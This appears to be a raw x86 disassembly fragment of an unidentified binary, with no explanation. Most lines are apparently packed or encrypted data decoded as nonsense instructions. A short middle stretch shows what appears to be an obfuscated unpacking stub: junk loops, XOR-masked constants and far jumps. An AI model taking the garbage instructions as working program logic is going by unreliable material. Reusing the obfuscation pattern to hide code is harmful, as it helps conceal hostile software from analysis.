  40d9cc:	or     BYTE PTR [edi+edx*8-0x4c],ch
  40d9d0:	inc    edx
  40d9d1:	hlt    
  40d9d2:	test   al,0x50
  40d9d4:	dec    edi
  40d9d5:	push   ss
  40d9d6:	or     eax,0x325d7f80
  40d9db:	xor    ebp,DWORD PTR [ebp-0x57e47691]
  40d9e1:	mov    edi,0x1ff9a149
  40d9e6:	stos   BYTE PTR es:[edi],al
  40d9e7:	iret   
  40d9e8:	shl    DWORD PTR cs:0x6f880787,cl
  40d9ef:	arpl   WORD PTR [ebx-0x3b],sp
  40d9f2:	lock retf 0xf5af
  40d9f6:	sbb    BYTE PTR [esi],bl
  40d9f8:	into   
  40d9f9:	jl     0x40da62
  40d9fb:	sub    esp,esi
  40d9fd:	arpl   di,ax
  40d9ff:	dec    ebp
  40da00:	adc    eax,0x54a86e62
  40da05:	loope  0x40da54
  40da07:	rcr    DWORD PTR [eax-0x7c1668d6],1
  40da0d:	int    0x2a
  40da0f:	aaa    
  40da10:	call   0x9dca:0x6e6f0e43
  40da17:	push   edx
  40da18:	test   eax,0x9b309994
  40da1d:	sahf   
  40da1e:	sub    ah,BYTE PTR [ebp+ebp*8-0x715f03c0]
  40da25:	sti    
  40da26:	sbb    edx,esp
  40da28:	lea    eax,ds:0x1d6c4c11
  40da2e:	jne    0x40da4d
  40da30:	sbb    dl,BYTE PTR [ecx+eiz*1-0x6d3ad4f4]
  40da37:	inc    edi
  40da38:	retf   
  40da39:	loope  0x40da81
  40da3b:	retf   0xe412
  40da3e:	jbe    0x40d9f7
  40da40:	mul    DWORD PTR [ecx]
  40da42:	test   DWORD PTR [esi+0x56],0xd942c3bb
  40da49:	test   al,0x56
  40da4b:	ret    0xa9e5
  40da4e:	push   DWORD PTR [edx+0x7f]
  40da51:	ret    
  40da52:	test   dh,cl
  40da54:	dec    ebx
  40da55:	cs jb  0x40dad0
  40da58:	or     DWORD PTR [edx-0xf],ecx
  40da5b:	lods   eax,DWORD PTR ds:[esi]
  40da5c:	std    
  40da5d:	das    
  40da5e:	dec    ebx
  40da5f:	fwait
  40da60:	cmovb  di,bp
  40da64:	jmp    0xad9b23e9
  40da69:	cmp    eax,DWORD PTR [ebx+0x68]
  40da6c:	es mov edi,0x37e9712e
  40da72:	rcl    BYTE PTR [edx+0x53aec5ce],0x14
  40da79:	imul   eax,DWORD PTR [edi-0xb],0x19
  40da7d:	popa   
  40da7e:	fimul  DWORD PTR [eax+0x1ba5a38f]
  40da84:	push   cs
  40da85:	and    bh,BYTE PTR [ecx]
  40da87:	dec    BYTE PTR [edi+0x13]
  40da8a:	mov    ecx,0xf46acac8
  40da8f:	lea    esi,[bx-0x47]
  40da93:	or     DWORD PTR [ebx],ecx
  40da95:	into   
  40da96:	outs   dx,BYTE PTR ds:[esi]
  40da97:	imul   esi,DWORD PTR [edx],0xb948b6c7
  40da9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40da9e:	jo     0x40dac3
  40daa0:	pusha  
  40daa1:	pusha  
  40daa2:	test   al,0xf3
  40daa4:	or     BYTE PTR [ecx+0x1c],bl
  40daa7:	cli    
  40daa8:	pop    esp
  40daa9:	icebp  
  40daaa:	arpl   di,bp
  40daac:	sar    DWORD PTR [ebp+0x3a],cl
  40daaf:	retf   0x37b1
  40dab2:	div    DWORD PTR ds:0xb263f59a
  40dab8:	add    esi,0x58df5143
  40dabe:	das    
  40dabf:	sahf   
  40dac0:	ret    
  40dac1:	inc    esp
  40dac2:	call   0xa17d1699
  40dac7:	xchg   ebp,eax
  40dac8:	ja     0x40daea
  40daca:	jbe    0x40daa0
  40dacc:	mov    eax,0xa992a69b
  40dad1:	popa   
  40dad2:	jmp    0xa28f3f64
  40dad7:	je     0x40db30
  40dad9:	push   ds
  40dada:	pop    ss
  40dadb:	repnz pop ebx
  40dadd:	cli    
  40dade:	push   0xffffffe7
  40dae0:	adc    BYTE PTR [eax],dl
  40dae2:	out    dx,al
  40dae3:	push   ebp
  40dae4:	mov    edx,0xba3e23e0
  40dae9:	push   ss
  40daea:	push   ebp
  40daeb:	dec    ebp
  40daec:	push   ebx
  40daed:	push   0xe6aa1ef0
  40daf2:	outs   dx,DWORD PTR ds:[esi]
  40daf3:	jno    0x40daeb
  40daf5:	sbb    eax,DWORD PTR ds:0x68a77198
  40dafb:	mov    edi,0x28101d0
  40db00:	test   al,0x49
  40db02:	out    dx,eax
  40db03:	add    DWORD PTR [ebp-0x29],edx
  40db06:	std    
  40db07:	test   DWORD PTR [eax+0x7a],ebx
  40db0a:	jg     0x40dac4
  40db0c:	in     eax,0x96
  40db0e:	fndisi(8087 only) 
  40db10:	lods   al,BYTE PTR ds:[esi]
  40db11:	adc    DWORD PTR ds:0x83f13aed,ecx
  40db17:	std    
  40db18:	iret   
  40db19:	stc    
  40db1a:	popa   
  40db1b:	inc    ecx
  40db1c:	push   ecx
  40db1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db1e:	push   ebx
  40db1f:	stos   BYTE PTR es:[edi],al
  40db20:	xchg   edx,eax
  40db21:	mov    dl,0x7f
  40db23:	mov    ebx,0x7c1c6e9a
  40db28:	push   ecx
  40db29:	fistp  DWORD PTR [eax]
  40db2b:	xor    ebp,DWORD PTR [esi+0x7f]
  40db2e:	or     dh,BYTE PTR [esi-0x52]
  40db31:	xchg   edx,eax
  40db32:	repnz add DWORD PTR [edx-0x2d4688b4],eax
  40db39:	push   ebp
  40db3a:	lock xchg BYTE PTR [esi-0x2f],cl
  40db3e:	int3   
  40db3f:	xor    al,0x3e
  40db41:	rol    DWORD PTR [ecx],cl
  40db43:	jge    0x40dafa
  40db45:	adc    bh,BYTE PTR [esi+0xa169502]
  40db4b:	mov    bl,BYTE PTR [ecx-0x58]
  40db4e:	shl    DWORD PTR [eax-0x774ef0f1],cl
  40db54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40db55:	sar    DWORD PTR [eax],1
  40db57:	dec    eax
  40db58:	jno    0x40dade
  40db5a:	mov    ss,WORD PTR [edi+0x28a2cb26]
  40db60:	lds    edx,FWORD PTR [ebx+0x3c3cbf89]
  40db66:	jb     0x40dbd0
  40db68:	outs   dx,BYTE PTR ds:[esi]
  40db69:	mov    BYTE PTR es:[edx+0x26199817],bh
  40db70:	out    dx,al
  40db71:	sbb    ebp,edi
  40db73:	cmp    DWORD PTR [edx],ecx
  40db75:	pop    esi
  40db76:	cmp    bh,ch
  40db78:	dec    esi
  40db79:	inc    eax
  40db7a:	xchg   edx,eax
  40db7b:	cs ins BYTE PTR es:[edi],dx
  40db7d:	pop    eax
  40db7e:	out    0x7d,eax
  40db80:	mov    cl,0xf8
  40db82:	lds    esp,FWORD PTR [ebx-0x6416ce68]
  40db88:	inc    esp
  40db89:	sbb    BYTE PTR [edi],0x9e
  40db8c:	mov    esi,0x366f5553
  40db91:	data16 shl BYTE PTR [esi+0x3b12e4b0],1
  40db98:	mov    dl,0xb6
  40db9a:	ror    ch,cl
  40db9c:	je     0x40db30
  40db9e:	pushf  
  40db9f:	test   DWORD PTR [eax],0x674e2245
  40dba5:	jb     0x40dbb3
  40dba7:	mov    eax,ds:0xe1a892ca
  40dbac:	(bad)  
  40dbae:	and    BYTE PTR [esi-0x6d286d75],al
  40dbb4:	scas   al,BYTE PTR es:[edi]
  40dbb5:	in     al,0x33
  40dbb7:	inc    ebp
  40dbb8:	aam    0x55
  40dbba:	pop    eax
  40dbbb:	call   0x282f86df
  40dbc0:	push   cs
  40dbc1:	cld    
  40dbc2:	xchg   ecx,eax
  40dbc3:	jge    0x40dc19
  40dbc5:	aaa    
  40dbc6:	xlat   BYTE PTR ds:[ebx]
  40dbc7:	inc    ebp
  40dbc8:	push   ebp
  40dbc9:	out    0xfe,al
  40dbcb:	popa   
  40dbcc:	loopne 0x40dbe4
  40dbce:	xor    BYTE PTR [ecx-0x4ce96495],0x19
  40dbd5:	scas   al,BYTE PTR es:[edi]
  40dbd6:	loope  0x40dbbb
  40dbd8:	call   0xacd52973
  40dbdd:	sub    BYTE PTR [edx-0x45],dl
  40dbe0:	mov    WORD PTR [ecx],ds
  40dbe2:	pop    ecx
  40dbe3:	sub    eax,0xfb5e8934
  40dbe8:	push   cs
  40dbe9:	push   ebp
  40dbea:	lds    eax,FWORD PTR [edx-0x4942a349]
  40dbf0:	pushf  
  40dbf1:	in     al,dx
  40dbf2:	sahf   
  40dbf3:	xchg   edx,eax
  40dbf4:	pop    ebp
  40dbf5:	sub    DWORD PTR [ecx],edx
  40dbf7:	and    edi,DWORD PTR [eax-0x35e0c681]
  40dbfd:	mov    DWORD PTR [edi+0x7c764196],ebx
  40dc03:	pop    eax
  40dc04:	retf   
  40dc05:	inc    ecx
  40dc06:	retf   
  40dc07:	mov    esi,0x8d67c9b6
  40dc0c:	push   0x40
  40dc0e:	and    bh,al
  40dc10:	jmp    0xa4ba:0x7328c702
  40dc17:	mov    edi,DWORD PTR [eax-0x1a421a4b]
  40dc1d:	(bad)  
  40dc1f:	or     DWORD PTR [ebx-0x47],esp
  40dc22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc23:	outs   dx,BYTE PTR ds:[esi]
  40dc24:	out    0x75,al
  40dc26:	adc    eax,0xfb5341b1
  40dc2b:	cli    
  40dc2c:	xchg   DWORD PTR [esi+0x2d089108],esp
  40dc32:	xlat   BYTE PTR ds:[ebx]
  40dc33:	adc    al,0xd
  40dc35:	adc    eax,0x9fdd26b6
  40dc3a:	shl    eax,1
  40dc3c:	and    BYTE PTR [edi],cl
  40dc3e:	push   ebp
  40dc3f:	out    0x53,al
  40dc41:	inc    ebp
  40dc42:	mov    edi,0xb872be11
  40dc47:	mov    ebx,0xb28dbef4
  40dc4c:	retf   
  40dc4d:	cmc    
  40dc4e:	call   0x4d277d45
  40dc53:	pop    ebp
  40dc54:	mov    ecx,0x697606a2
  40dc59:	aam    0xe7
  40dc5b:	inc    ecx
  40dc5c:	jp     0x40dcab
  40dc5e:	mov    cl,0xb3
  40dc60:	jbe    0x40dbfb
  40dc62:	sar    DWORD PTR [esi+ebp*4+0x1b],1
  40dc66:	jmp    0xaa8dea02
  40dc6b:	pop    ds
  40dc6c:	xchg   ebx,eax
  40dc6d:	mov    DWORD PTR [esi-0x3f],0x16bf3c1
  40dc74:	dec    edi
  40dc75:	mov    al,ds:0xf89ef201
  40dc7a:	add    eax,0xcb940564
  40dc7f:	and    al,0x65
  40dc81:	mov    bh,0xe
  40dc83:	xchg   edx,eax
  40dc84:	jns    0x40dc5f
  40dc86:	xchg   ebp,eax
  40dc87:	xor    ch,BYTE PTR [esi+0x66]
  40dc8a:	iret   
  40dc8b:	ret    0x7a21
  40dc8e:	aam    0x9f
  40dc90:	dec    edi
  40dc91:	pop    ebx
  40dc92:	push   ds
  40dc93:	(bad)  
  40dc94:	cld    
  40dc95:	call   DWORD PTR [ebp-0xfe5dbf0]
  40dc9b:	cmp    esi,DWORD PTR [esi]
  40dc9d:	ror    BYTE PTR [eax+0x4b],0xd3
  40dca1:	xlat   BYTE PTR ds:[ebx]
  40dca2:	daa    
  40dca3:	lods   eax,DWORD PTR ds:[esi]
  40dca4:	pop    esi
  40dca5:	and    DWORD PTR [edx+0x685caf93],esp
  40dcab:	test   BYTE PTR [eax],bh
  40dcad:	ret    
  40dcae:	jo     0x40dcbe
  40dcb0:	out    0xd1,al
  40dcb2:	jge    0x40dc59
  40dcb4:	mov    edx,0x5cd53a4
  40dcb9:	pusha  
  40dcba:	mov    bl,0xe
  40dcbc:	test   BYTE PTR [ecx],0x2
  40dcbf:	je     0x40dc64
  40dcc1:	lods   eax,DWORD PTR ds:[esi]
  40dcc2:	call   0x5139:0x38e1a625
  40dcc9:	int    0x4c
  40dccb:	out    dx,eax
  40dccc:	(bad)  
  40dccd:	adc    al,0xcf
  40dccf:	icebp  
  40dcd0:	mov    edx,0xaf4deb02
  40dcd5:	mov    ch,0x76
  40dcd7:	dec    esp
  40dcd8:	pop    eax
  40dcd9:	pop    ebp
  40dcda:	dec    esi
  40dcdb:	or     ah,0xd1
  40dcde:	cli    
  40dcdf:	push   ss
  40dce0:	mov    ebx,0x590c803b
  40dce5:	(bad)  
  40dce6:	xor    DWORD PTR [edx+0x5e59a58b],ecx
  40dcec:	cld    
  40dced:	jmp    0x40dce0
  40dcef:	fcmovbe st,st(7)
  40dcf1:	xor    al,0x1f
  40dcf3:	inc    edx
  40dcf4:	das    
  40dcf5:	popf   
  40dcf6:	and    eax,0x30dd425e
  40dcfb:	(bad)  
  40dcfc:	pushf  
  40dcfd:	rol    DWORD PTR ds:0xfdf10cc6,0x90
  40dd04:	jle    0x40dd12
  40dd06:	push   ebp
  40dd07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd08:	and    ch,BYTE PTR [edi+0x1adea511]
  40dd0e:	cmp    eax,0x19269829
  40dd13:	mov    BYTE PTR [edi-0x62],bh
  40dd16:	inc    eax
  40dd17:	jle    0x40dd29
  40dd19:	xor    ecx,esi
  40dd1b:	add    DWORD PTR ds:0x42a018,0x42a000
  40dd25:	mov    DWORD PTR [ebp-0x34],eax
  40dd28:	add    ecx,edi
  40dd2a:	jmp    0x4191e1
  40dd2f:	sub    DWORD PTR ds:0x42a018,edi
  40dd35:	lea    edx,[ecx+eax*1]
  40dd38:	mov    DWORD PTR [ebp-0x28],edx
  40dd3b:	mov    edx,DWORD PTR [ebp-0x44]
  40dd3e:	mov    ebx,DWORD PTR ds:0x429004
  40dd44:	add    DWORD PTR ds:0x42c008,ebx
  40dd4a:	sub    edx,ecx
  40dd4c:	mov    DWORD PTR ds:0x42b004,0x1e
  40dd56:	cmp    DWORD PTR ds:0x42b004,0x0
  40dd5d:	je     0x40dd97
  40dd63:	cmp    DWORD PTR ds:0x42b004,0x28
  40dd6a:	jne    0x40dd85
  40dd70:	push   0x3a6a
  40dd75:	push   0x42b010
  40dd7a:	push   0x42365e
  40dd7f:	call   DWORD PTR ds:0x424048
  40dd85:	mov    ebx,DWORD PTR ds:0x42b004
  40dd8b:	dec    ebx
  40dd8c:	mov    DWORD PTR ds:0x42b004,ebx
  40dd92:	jmp    0x40dd56
  40dd97:	mov    DWORD PTR [ebp-0x24],edx
  40dd9a:	mov    edx,DWORD PTR [ebp-0x24]
  40dd9d:	and    DWORD PTR ds:0x428008,edi
  40dda3:	mov    DWORD PTR [ebp-0x14],edx
  40dda6:	not    edx
  40dda8:	mov    edx,DWORD PTR [ebp-0x28]
  40ddab:	mov    DWORD PTR ds:0x42800c,0x11
  40ddb5:	cmp    DWORD PTR ds:0x42800c,0x0
  40ddbc:	je     0x40de6b
  40ddc2:	cmp    DWORD PTR ds:0x42800c,0x8
  40ddc9:	jne    0x40dddd
  40ddcf:	push   0x42a010
  40ddd4:	push   DWORD PTR [ebp-0x28]
  40ddd7:	call   DWORD PTR ds:0x424014
  40dddd:	cmp    DWORD PTR ds:0x42800c,0x9
  40dde4:	jne    0x40ddf7
  40ddea:	mov    ebx,DWORD PTR ds:0x42800c
  40ddf0:	dec    ebx
  40ddf1:	mov    DWORD PTR ds:0x42800c,ebx
  40ddf7:	xor    ebx,ebx
  40ddf9:	or     ebx,DWORD PTR ds:0x42800c
  40ddff:	dec    ebx
  40de00:	mov    DWORD PTR ds:0x42800c,ebx
  40de06:	jmp    0x40ddb5
  40de0b:	mov    DWORD PTR ds:0x429004,0x17
  40de15:	cmp    DWORD PTR ds:0x429004,0x0
  40de1c:	je     0x40de6b
  40de22:	cmp    DWORD PTR ds:0x429004,0x25
  40de29:	jne    0x40de57
  40de2f:	push   0x85b6
  40de34:	push   0x42a018
  40de39:	push   DWORD PTR [ebp-0x24]
  40de3c:	push   0x42c000
  40de41:	push   0x5138
  40de46:	push   DWORD PTR [ebp-0x24]
  40de49:	push   0x4b55
  40de4e:	push   DWORD PTR [ebp-0x24]
  40de51:	call   DWORD PTR ds:0x424018
  40de57:	xor    ebx,ebx
  40de59:	add    ebx,DWORD PTR ds:0x429004
  40de5f:	dec    ebx
  40de60:	mov    DWORD PTR ds:0x429004,ebx
  40de66:	jmp    0x40de15
  40de6b:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  40de72:	mov    DWORD PTR [ebp-0x40],edx
  40de75:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  40de7c:	mov    edx,DWORD PTR [ebp-0x3c]
  40de7f:	xor    edx,esi
  40de81:	add    edx,edi
  40de83:	mov    DWORD PTR [ebp-0x10],edx
  40de86:	mov    edx,DWORD PTR [ebp-0x3c]
  40de89:	xor    edx,esi
  40de8b:	add    edx,edi
  40de8d:	mov    DWORD PTR [ebp-0x8],edx
  40de90:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  40de97:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  40de9e:	mov    edx,DWORD PTR [ebp-0x3c]
  40dea1:	mov    ebx,DWORD PTR [ebp-0x14]
  40dea4:	xor    edx,esi
  40dea6:	add    edx,edi
  40dea8:	cmp    ebx,edx
  40deaa:	je     0x4191d5
  40deb0:	mov    eax,DWORD PTR [ebp-0x18]
  40deb3:	xor    eax,esi
  40deb5:	mov    edx,0xffcd8d25
  40deba:	sub    edx,eax
  40debc:	add    edx,DWORD PTR [ebp-0x14]
  40debf:	mov    eax,DWORD PTR [ebp-0x18]
  40dec2:	mov    ebx,DWORD PTR [ebp-0x10]
  40dec5:	xor    eax,esi
  40dec7:	jmp    0x41023c
  40decc:	and    ecx,DWORD PTR [eax+0x3]
  40decf:	scas   eax,DWORD PTR es:[edi]
  40ded0:	jecxz  0x40df3d
  40ded2:	arpl   sp,ax
  40ded4:	jns    0x40de7a
  40ded6:	cmp    edi,edi
  40ded8:	mov    ch,0x3e
  40deda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dedb:	inc    edx
  40dedc:	pop    ss
  40dedd:	shl    DWORD PTR [edx+0x62],1
  40dee0:	or     bl,BYTE PTR [edi+0x62]
  40dee3:	(bad)  
  40dee5:	push   0xffffff97
  40dee7:	retf   
  40dee8:	fst    DWORD PTR [ebx+0x32]
  40deeb:	jnp    0x40dece
  40deed:	add    esi,DWORD PTR ds:0xbf59009e
  40def3:	inc    esi
  40def4:	out    0xd6,eax
  40def6:	icebp  
  40def7:	pop    ds
  40def8:	or     BYTE PTR [ebx+0x2b10cd75],al
  40defe:	imul   eax,DWORD PTR [eax-0x6e92ac1],0xffffff8a
  40df05:	in     al,0x9e
  40df07:	pop    ecx
  40df08:	fisubr DWORD PTR [ecx+0x7a737de9]
  40df0e:	ins    BYTE PTR es:[edi],dx
  40df0f:	adc    eax,0x4cf8cdd4
  40df14:	mov    al,ds:0xf8bad4b0
  40df19:	mov    cl,0xc
  40df1b:	cli    
  40df1c:	mov    bl,0x18
  40df1e:	outs   dx,BYTE PTR ds:[esi]
  40df1f:	fs pop ecx
  40df21:	(bad)  
  40df22:	mov    esp,0xb0795e5c
  40df27:	or     al,0xe0
  40df29:	(bad)  
  40df2a:	sbb    DWORD PTR [edi],esp
  40df2c:	sbb    BYTE PTR [esi+0x7b],dl
  40df2f:	mov    ebx,0xd2ebf269
  40df34:	sar    BYTE PTR [ebx],1
  40df36:	sub    al,0xe6
  40df38:	xchg   esi,eax
  40df39:	push   0x344ebd34
  40df3e:	push   eax
  40df3f:	push   esi
  40df40:	call   0xe97124b0
  40df45:	mov    dl,0xf1
  40df47:	call   0x40815be7
  40df4c:	xchg   esi,eax
  40df4d:	sub    al,0xa2
  40df4f:	dec    esp
  40df50:	js     0x40df25
  40df52:	gs dec ecx
  40df54:	dec    edi
  40df55:	and    esi,edx
  40df57:	sbb    edi,DWORD PTR [esi-0x790119d6]
  40df5d:	mov    ah,cl
  40df5f:	sbb    al,0x82
  40df61:	mov    dh,0x63
  40df63:	test   eax,0x7e8e5e2
  40df68:	cmp    eax,0xfa46481
  40df6d:	sub    ecx,ecx
  40df6f:	sub    al,0xc
  40df71:	jp     0x40dfd2
  40df73:	das    
  40df74:	(bad)  
  40df75:	imul   dh
  40df77:	mov    ebp,0x40352ea4
  40df7c:	lea    edx,[eax]
  40df7e:	xchg   esp,eax
  40df7f:	lods   eax,DWORD PTR ds:[esi]
  40df80:	sbb    esi,DWORD PTR es:[eax+esi*8+0xc]
  40df85:	fstp   DWORD PTR [esi-0x2c]
  40df88:	or     BYTE PTR [ebp+0xa868ab3],0xaa
  40df8f:	in     eax,dx
  40df90:	das    
  40df91:	(bad)  
  40df93:	mov    ah,0x91
  40df95:	xlat   BYTE PTR ds:[ebx]
  40df96:	mov    ah,0xae
  40df98:	std    
  40df99:	jmp    0xdfdbb74f
  40df9e:	test   BYTE PTR [esi+0x9237311],ch
  40dfa4:	cmp    eax,DWORD PTR [bp+si-0x1c]
  40dfa8:	daa    
  40dfa9:	xchg   BYTE PTR [ecx+ebx*8+0x1258ea4c],al
  40dfb0:	pop    ebx
  40dfb1:	sub    BYTE PTR [eax+eax*8+0x223ba064],ch
  40dfb8:	mov    DWORD PTR [ebx],edi
  40dfba:	inc    esp
  40dfbb:	sbb    BYTE PTR [ecx-0x68719ebd],bl
  40dfc1:	push   es
  40dfc2:	in     al,0x88
  40dfc4:	lock cld 
  40dfc6:	push   esp
  40dfc7:	pop    ebx
  40dfc8:	hlt    
  40dfc9:	dec    ecx
  40dfca:	jp     0x40dfc2
  40dfcc:	push   ebp
  40dfcd:	jo     0x40dfc2
  40dfcf:	pusha  
  40dfd0:	int3   
  40dfd1:	pop    edx
  40dfd2:	sub    BYTE PTR [esi],bh
  40dfd4:	lds    eax,FWORD PTR [ecx+0x7e4948ea]
  40dfda:	mov    dl,0x7
  40dfdc:	lock retf 
  40dfde:	rol    BYTE PTR [ecx+0x64b24ffb],cl
  40dfe4:	push   ds
  40dfe5:	or     esp,0xf1b8e67a
  40dfeb:	dec    eax
  40dfec:	dec    esp
  40dfed:	sbb    eax,0x26cb2018
  40dff2:	dec    edi
  40dff3:	setl   bh
  40dff6:	lea    edi,[esi-0x4f]
  40dff9:	not    DWORD PTR [edi]
  40dffb:	pop    edx
  40dffc:	or     esi,DWORD PTR [ecx+0xab25030]
  40e002:	inc    ebx
  40e003:	or     ch,dh
  40e005:	sbb    BYTE PTR [ebx+0x3e1035ee],ah
  40e00b:	jae    0x40e01d
  40e00d:	add    esi,esi
  40e00f:	in     eax,dx
  40e010:	add    ah,BYTE PTR [edi-0x4e8262b7]
  40e016:	mov    eax,0x9d597f4b
  40e01b:	xchg   ebx,eax
  40e01c:	xchg   esp,edi
  40e01e:	(bad)  
  40e01f:	jl     0x40e06c
  40e021:	imul   esi,DWORD PTR [ecx+0x155408d8],0xad2ae476
  40e02b:	stos   DWORD PTR es:[edi],eax
  40e02c:	jp     0x40e01d
  40e02e:	push   ebp
  40e02f:	sub    al,dl
  40e031:	rcr    DWORD PTR gs:[edi-0x73],cl
  40e035:	and    DWORD PTR ds:0xcd9e9aee,ecx
  40e03b:	jnp    0x40e04e
  40e03d:	in     al,dx
  40e03e:	jmp    0x5f0a:0x2fe32042
  40e045:	dec    esp
  40e046:	test   eax,0x1b81a5b7
  40e04b:	add    al,0x2a
  40e04d:	(bad)  
  40e04e:	ror    BYTE PTR [edi+0x7a],0xf9
  40e052:	or     DWORD PTR [ebp-0x727e5bd0],esi
  40e058:	mov    bl,0xf6
  40e05a:	(bad)  
  40e05b:	jnp    0x40e091
  40e05d:	pop    ecx
  40e05e:	dec    eax
  40e05f:	inc    esp
  40e060:	push   es
  40e061:	repz pop ecx
  40e063:	out    0x5b,eax
  40e065:	pop    ds
  40e066:	jmp    0xf78a0b6e
  40e06b:	rcl    BYTE PTR [ebp+0x1c4997b5],1
  40e071:	cli    
  40e072:	xchg   edi,eax
  40e073:	ret    
  40e074:	mov    ebx,0x4015db41
  40e079:	jb     0x40e02d
  40e07b:	cmc    
  40e07c:	push   0x53
  40e07e:	jae    0x40e063
  40e080:	and    DWORD PTR [ecx+eax*2-0x6c],esp
  40e084:	std    
  40e085:	sub    bl,0x6b
  40e088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e089:	sub    ebp,esi
  40e08b:	mov    al,ds:0x92bc94ba
  40e090:	cld    
  40e091:	mov    ecx,0xa2f08a6e
  40e096:	mov    eax,0xdea68c2d
  40e09b:	icebp  
  40e09c:	adc    ecx,DWORD PTR [ecx-0x2b7f6ce8]
  40e0a2:	and    cl,BYTE PTR [edi]
  40e0a4:	pop    edi
  40e0a5:	(bad)  
  40e0a6:	jmp    0xf16267e2
  40e0ab:	(bad)  
  40e0ad:	sbb    eax,0x1c32e88a
  40e0b2:	xchg   esp,eax
  40e0b3:	adc    BYTE PTR [edx-0x28],ah
  40e0b6:	repnz dec ebp
  40e0b8:	jae    0x40e072
  40e0ba:	mov    dh,0x8a
  40e0bc:	push   ss
  40e0bd:	and    cl,BYTE PTR [edx+0x46]
  40e0c0:	push   ebp
  40e0c1:	cmp    eax,0xd177615b
  40e0c6:	pushf  
  40e0c7:	pop    ecx
  40e0c8:	and    ch,BYTE PTR [edx-0x45010d50]
  40e0ce:	popf   
  40e0cf:	inc    DWORD PTR [esi]
  40e0d1:	push   esp
  40e0d2:	fstp   QWORD PTR [ecx-0x76]
  40e0d5:	xchg   ecx,eax
  40e0d6:	push   ebx
  40e0d7:	xchg   esp,eax
  40e0d8:	fiadd  DWORD PTR [edi]
  40e0da:	loope  0x40e082
  40e0dc:	push   cs
  40e0dd:	rol    dh,cl
  40e0df:	int    0xeb
  40e0e1:	stc    
  40e0e2:	or     DWORD PTR ds:0xdf72a3e0,ecx
  40e0e8:	int3   
  40e0e9:	data16 mov al,ds:0xae946f5e
  40e0ef:	inc    eax
  40e0f0:	fwait
  40e0f1:	and    esi,ecx
  40e0f3:	jns    0x40e110
  40e0f5:	add    eax,0x1f43a6f0
  40e0fa:	(bad)  
  40e0fc:	sbb    eax,0xbb2bdf0c
  40e101:	sbb    al,0xf8
  40e103:	dec    edx
  40e104:	sbb    DWORD PTR [ecx+0x44b4f588],eax
  40e10a:	arpl   WORD PTR [edi-0x493d3425],bx
  40e110:	cmp    BYTE PTR [eax-0x118120d8],0x1a
  40e117:	imul   bl
  40e119:	jecxz  0x40e0ca
  40e11b:	or     BYTE PTR [ecx],0x2c
  40e11e:	ins    DWORD PTR es:[edi],dx
  40e11f:	sar    cl,cl
  40e121:	pop    ss
  40e122:	add    DWORD PTR [ecx],esp
  40e124:	lahf   
  40e125:	pop    ebx
  40e126:	pushf  
  40e127:	xchg   esi,eax
  40e128:	or     BYTE PTR [ebx],bl
  40e12a:	xor    edi,esp
  40e12c:	jne    0x40e16b
  40e12e:	call   0x945e:0xf0a26e5b
  40e135:	les    edx,FWORD PTR [ecx+0x553fe15c]
  40e13b:	xchg   esp,eax
  40e13c:	xchg   esi,eax
  40e13d:	(bad)  
  40e13e:	dec    edx
  40e13f:	cs popf 
  40e141:	pop    ebx
  40e142:	inc    edx
  40e143:	bound  ebx,QWORD PTR [eax+edx*1]
  40e146:	dec    edx
  40e147:	fcom   DWORD PTR [eax]
  40e149:	mov    edx,0x53c38988
  40e14e:	mov    eax,ds:0x959487ca
  40e153:	or     BYTE PTR [eax-0x3dc96ea],dh
  40e159:	xchg   BYTE PTR fs:[ecx-0x3b932fc8],bl
  40e160:	push   esi
  40e161:	push   es
  40e162:	and    BYTE PTR [edx-0x65],dh
  40e165:	or     esp,0xd365546
  40e16b:	pushf  
  40e16c:	out    dx,eax
  40e16d:	pushf  
  40e16e:	push   ss
  40e16f:	sahf   
  40e170:	dec    edi
  40e171:	ret    0xd2e2
  40e174:	out    0x96,al
  40e176:	inc    ecx
  40e177:	dec    esp
  40e178:	popf   
  40e179:	sbb    ecx,eax
  40e17b:	sub    al,0x7e
  40e17d:	jne    0x40e138
  40e17f:	sub    al,0xbc
  40e181:	sbb    cl,cl
  40e183:	in     al,dx
  40e184:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e185:	or     esp,DWORD PTR [eax-0x69e74e15]
  40e18b:	mov    al,ds:0x5d5de537
  40e190:	(bad)  
  40e191:	in     eax,dx
  40e192:	adc    al,0x90
  40e194:	(bad)  
  40e195:	out    dx,al
  40e196:	loopne 0x40e1c5
  40e198:	and    eax,0xafee4326
  40e19d:	push   0x4f
  40e19f:	mov    esp,DWORD PTR [esi]
  40e1a1:	mov    ds:0x41a632e6,eax
  40e1a6:	pop    edx
  40e1a7:	inc    esi
  40e1a8:	iret   
  40e1a9:	sub    dh,BYTE PTR [ebx]
  40e1ab:	and    bh,dh
  40e1ad:	stc    
  40e1ae:	aaa    
  40e1af:	jmp    0x36773e13
  40e1b4:	cli    
  40e1b5:	outs   dx,BYTE PTR ds:[esi]
  40e1b6:	imul   edx,DWORD PTR [ecx],0x15
  40e1b9:	adc    ecx,DWORD PTR [eax]
  40e1bb:	mov    dh,0x1a
  40e1bd:	jecxz  0x40e1ec
  40e1bf:	and    bl,BYTE PTR [eax+0x7d]
  40e1c2:	sub    BYTE PTR [ecx+0x39],dh
  40e1c5:	dec    ecx
  40e1c6:	add    eax,0xd9afb00c
  40e1cb:	jmp    DWORD PTR [edi+0x28a2b644]
  40e1d1:	outs   dx,DWORD PTR ds:[esi]
  40e1d2:	dec    ebp
  40e1d3:	fcom   st(1)
  40e1d5:	adc    al,0xeb
  40e1d7:	aas    
  40e1d8:	test   al,0x29
  40e1da:	scas   al,BYTE PTR es:[edi]
  40e1db:	shr    BYTE PTR [ebx+0x59],0x48
  40e1df:	push   0x53
  40e1e1:	mov    ds:0x63cc1332,eax
  40e1e6:	out    0xd7,eax
  40e1e8:	retf   0x6255
  40e1eb:	dec    ebp
  40e1ec:	dec    edx
